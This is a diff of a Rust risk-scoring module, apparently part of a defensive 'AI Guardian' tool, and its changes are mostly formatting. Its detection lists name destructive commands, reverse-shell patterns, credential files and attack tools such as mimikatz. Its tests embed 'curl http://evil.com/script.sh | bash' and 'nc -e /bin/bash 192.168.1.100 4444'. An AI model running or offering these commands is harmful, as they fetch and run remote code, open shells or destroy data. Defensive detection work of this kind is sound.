@@ -1,5 +1,5 @@
 //! AI Guardian AI Analyzer
-//! 
+//!
 //! 使用本地 LLM 进行命令语义分析
 
 use super::{OperationEvent, OperationType};
@@ -29,41 +29,41 @@ impl AiAnalyzer {
             risk_patterns: Self::load_default_patterns(),
         }
     }
-    
+
     /// 分析操作事件
     pub fn analyze(&self, event: &OperationEvent) -> u32 {
         let mut score = 0;
-        
+
         // 1. 检查命令行中的风险关键词
         score += self.analyze_command_line(&event.command_line);
-        
+
         // 2. 检查目标路径风险
         if let Some(ref path) = event.target_path {
             score += self.analyze_path(path);
         }
-        
+
         // 3. 检查操作类型风险
         score += self.analyze_operation_type(&event.operation_type);
-        
+
         // 4. 检查进程名风险
         score += self.analyze_process_name(&event.process_name);
-        
+
         // 5. 匹配风险模式
         for pattern in &self.risk_patterns {
             if self.matches_pattern(event, pattern) {
                 score += pattern.risk_score;
             }
         }
-        
+
         // 限制在 0-100 范围
         score.min(100)
     }
-    
+
     /// 分析命令行
     fn analyze_command_line(&self, cmdline: &str) -> u32 {
         let cmd_lower = cmdline.to_lowercase();
         let mut score = 0;
-        
+
         // 高风险命令
         let high_risk_commands = vec![
             ("rm -rf /", 100),
@@ -75,13 +75,13 @@ impl AiAnalyzer {
             ("format c:", 100),
             ("rd /s /q c:\\", 100),
         ];
-        
+
         for (cmd, risk) in &high_risk_commands {
             if cmd_lower.contains(cmd) {
                 score += risk;
             }
         }
-        
+
         // 中风险命令
         let medium_risk_patterns = vec![
             ("curl", "| bash", 60),
@@ -92,35 +92,35 @@ impl AiAnalyzer {
             ("certutil", "-decode", 50),
             ("bitsadmin", "/transfer", 50),
         ];
-        
+
         for (cmd1, cmd2, risk) in &medium_risk_patterns {
             if cmd_lower.contains(cmd1) && cmd_lower.contains(cmd2) {
                 score += risk;
             }
         }
-        
+
         // 网络相关风险
         if cmd_lower.contains("nc -e") || cmd_lower.contains("ncat -e") {
             score += 80; // 反向 shell
         }
-        
+
         if cmd_lower.contains("/dev/tcp/") && cmd_lower.contains("/bin/bash") {
             score += 90; // bash 反向 shell
         }
-        
+
         // 权限提升
         if cmd_lower.contains("sudo") && cmd_lower.contains("su") {
             score += 40;
         }
-        
+
         score
     }
-    
+
     /// 分析路径
     fn analyze_path(&self, path: &str) -> u32 {
         let path_lower = path.to_lowercase();
         let mut score = 0;
-        
+
         // 系统关键路径
         let critical_paths = vec![
             ("/etc/passwd", 80),
@@ -133,16 +133,16 @@ impl AiAnalyzer {
             ("c:\\windows\\syswow64", 60),
             ("\\registry\\machine\\sam", 90),
         ];
-        
+
         for (critical, risk) in &critical_paths {
             if path_lower.contains(critical) {
                 score += risk;
             }
         }
-        
+
         score
     }
-    
+
     /// 分析操作类型
     fn analyze_operation_type(&self, op_type: &OperationType) -> u32 {
         match op_type {
@@ -155,12 +155,12 @@ impl AiAnalyzer {
             _ => 0,
         }
     }
-    
+
     /// 分析进程名
     fn analyze_process_name(&self, name: &str) -> u32 {
         let name_lower = name.to_lowercase();
         let mut score = 0;
-        
+
         // 可疑进程名
         let suspicious_names = vec![
             ("mimikatz", 100),
@@ -177,23 +177,23 @@ impl AiAnalyzer {
             ("meterpreter", 100),
             (" cobaltstrike", 100),
         ];
-        
+
         for (suspicious, risk) in &suspicious_names {
             if name_lower.contains(suspicious) {
                 score += risk;
             }
         }
-        
+
         score
     }
-    
+
     /// 检查是否匹配风险模式
     fn matches_pattern(&self, event: &OperationEvent, pattern: &RiskPattern) -> bool {
         // 检查操作类型
         if !pattern.operation_types.contains(&event.operation_type) {
             return false;
         }
-        
+
         // 检查关键词
         let cmdline_lower = event.command_line.to_lowercase();
         for keyword in &pattern.keywords {
@@ -201,10 +201,10 @@ impl AiAnalyzer {
                 return true;
             }
         }
-        
+
         false
     }
-    
+
     /// 加载默认风险模式
     fn load_default_patterns() -> Vec<RiskPattern> {
         vec![
@@ -275,7 +275,7 @@ impl AiAnalyzer {
             },
         ]
     }
-    
+
     /// 添加自定义风险模式
     pub fn add_pattern(&mut self, pattern: RiskPattern) {
         // 这里简化处理，实际应该使用正确的 RiskPattern 结构
@@ -295,9 +295,10 @@ impl SemanticAnalysis {
     /// 分析命令语义
     pub fn analyze_command(command: &str) -> Self {
         let cmd_lower = command.to_lowercase();
-        
+
         // 简单的语义分析（实际应该使用 LLM）
-        if cmd_lower.contains("delete") || cmd_lower.contains("remove") || cmd_lower.contains("rm") {
+        if cmd_lower.contains("delete") || cmd_lower.contains("remove") || cmd_lower.contains("rm")
+        {
             if cmd_lower.contains("-rf") || cmd_lower.contains("/f") {
                 return Self {
                     intent: "Force deletion".to_string(),
@@ -307,18 +308,23 @@ impl SemanticAnalysis {
                 };
             }
         }
-        
-        if cmd_lower.contains("download") || cmd_lower.contains("curl") || cmd_lower.contains("wget") {
+
+        if cmd_lower.contains("download")
+            || cmd_lower.contains("curl")
+            || cmd_lower.contains("wget")
+        {
             if cmd_lower.contains("| bash") || cmd_lower.contains("| sh") {
                 return Self {
                     intent: "Download and execute".to_string(),
                     risk_level: "Critical".to_string(),
                     confidence: 0.95,
-                    explanation: "Downloading and immediately executing code is extremely dangerous".to_string(),
+                    explanation:
+                        "Downloading and immediately executing code is extremely dangerous"
+                            .to_string(),
                 };
             }
         }
-        
+
         Self {
             intent: "Unknown".to_string(),
             risk_level: "Low".to_string(),
@@ -331,7 +337,7 @@ impl SemanticAnalysis {
 #[cfg(test)]
 mod tests {
     use super::*;
-    
+
     fn create_test_event(cmdline: &str, op_type: OperationType) -> OperationEvent {
         OperationEvent {
             id: "test".to_string(),
@@ -351,31 +357,49 @@ mod tests {
             details: HashMap::new(),
         }
     }
-    
+
     #[test]
     fn test_rm_rf_analysis() {
         let analyzer = AiAnalyzer::new();
         let event = create_test_event("rm -rf /", OperationType::FileDelete);
         let score = analyzer.analyze(&event);
-        assert!(score >= 100, "Expected high score for rm -rf /, got {}", score);
+        assert!(
+            score >= 100,
+            "Expected high score for rm -rf /, got {}",
+            score
+        );
     }
-    
+
     #[test]
     fn test_curl_bash_analysis() {
         let analyzer = AiAnalyzer::new();
-        let event = create_test_event("curl http://evil.com/script.sh | bash", OperationType::ProcessExec);
+        let event = create_test_event(
+            "curl http://evil.com/script.sh | bash",
+            OperationType::ProcessExec,
+        );
         let score = analyzer.analyze(&event);
-        assert!(score >= 60, "Expected medium-high score for curl | bash, got {}", score);
+        assert!(
+            score >= 60,
+            "Expected medium-high score for curl | bash, got {}",
+            score
+        );
     }
-    
+
     #[test]
     fn test_reverse_shell_analysis() {
         let analyzer = AiAnalyzer::new();
-        let event = create_test_event("nc -e /bin/bash 192.168.1.100 4444", OperationType::NetworkConnect);
+        let event = create_test_event(
+            "nc -e /bin/bash 192.168.1.100 4444",
+            OperationType::NetworkConnect,
+        );
         let score = analyzer.analyze(&event);
-        assert!(score >= 80, "Expected high score for reverse shell, got {}", score);
+        assert!(
+            score >= 80,
+            "Expected high score for reverse shell, got {}",
+            score
+        );
     }
-    
+
     #[test]
     fn test_semantic_analysis() {
         let analysis = SemanticAnalysis::analyze_command("rm -rf /home/user/*");
